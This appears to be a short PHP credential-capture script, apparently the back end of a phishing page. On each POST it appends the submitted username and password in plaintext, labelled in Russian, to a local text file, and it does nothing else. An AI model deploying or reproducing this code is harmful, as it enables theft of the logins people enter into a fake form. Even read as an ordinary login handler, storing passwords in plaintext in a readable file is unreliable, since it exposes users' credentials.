<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    file_put_contents("user_credentials.txt", "Логин: $username, Пароль: $password\n", FILE_APPEND);
}
?>
